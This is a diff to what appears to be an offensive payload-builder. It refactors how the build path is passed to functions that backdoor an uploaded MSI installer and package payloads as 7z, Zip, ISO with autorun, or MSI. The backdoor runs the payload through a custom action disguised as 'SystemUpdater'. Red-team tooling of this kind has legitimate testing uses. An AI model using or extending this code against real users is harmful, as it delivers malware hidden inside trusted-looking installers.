@@ -565,7 +565,7 @@ generated if none have been entered.""",
                   step_description = "Adding payload into chosen container"),
     ]
 
-    async def backdoor_msi_payload(self):
+    async def backdoor_msi_payload(self, agent_build_path):
         """Backdoors an uploaded MSI installer with the generated payload and places it in the payload directory"""
         msi_backdoor_uuid = self.get_parameter("5.3 MSI Backdoor File")
         if not msi_backdoor_uuid:
@@ -600,7 +600,7 @@ generated if none have been entered.""",
             ))
             
             # Get the payload executable path
-            payload_dir = Path(self.agent_build_path) / "payload"
+            payload_dir = Path(agent_build_path) / "payload"
             try:
                 payload_exe = next(p for p in payload_dir.iterdir() if p.is_file() and p.suffix.lower() == ".exe")
             except StopIteration:
@@ -610,7 +610,7 @@ generated if none have been entered.""",
             backdoored_msi_path = hijack_msi(
                 source_msi=source_msi_path,
                 payload_path=payload_exe,
-                build_path=Path(self.agent_build_path),
+                build_path=Path(agent_build_path),
                 custom_action_name="SystemUpdater"
             )
             
@@ -644,14 +644,14 @@ generated if none have been entered.""",
                   return build_7z(
                     compression=self.get_parameter("3.1 Compression Level"),
                     password=self.get_parameter("3.2 Archive Password"),
-                    build_path=Path(self.agent_build_path)
+                    build_path=Path(agent_build_path)
                 )
 
             case "Zip":
                 return build_zip(
                     compression=self.get_parameter("3.1 Compression Level"),
                     password=self.get_parameter("3.2 Archive Password"),
-                    build_path=Path(self.agent_build_path)
+                    build_path=Path(agent_build_path)
                 )
 
             case "ISO":
@@ -670,12 +670,12 @@ generated if none have been entered.""",
                                     volume_id=self.get_parameter("4.0 ISO Volume ID"),
                                     enable_autorun = self.get_parameter("4.1 ISO enable Autorun"),
                                     source_iso=source_iso_path,
-                                    build_path=Path(self.agent_build_path)
+                                    build_path=Path(agent_build_path)
                                 )
 
             case "MSI":
                 return build_msi(
-                    build_path=Path(self.agent_build_path),
+                    build_path=Path(agent_build_path),
                     app_name=self.get_parameter("5.0 MSI Product Name"),
                     manufacturer=self.get_parameter("5.1 MSI Manufacturer"),
                     install_scope=self.get_parameter("5.2 MSI Install Scope")
@@ -1500,7 +1500,7 @@ generated if none have been entered.""",
             ######################### MSI Backdooring Section #########################
             
             # Backdoor MSI if user uploaded one (adds backdoored MSI to payload directory)
-            await self.backdoor_msi_payload()
+            await self.backdoor_msi_payload(agent_build_path)
             
             ######################### End Of MSI Backdooring Section #########################
             ######################### Final Payload / Container #########################
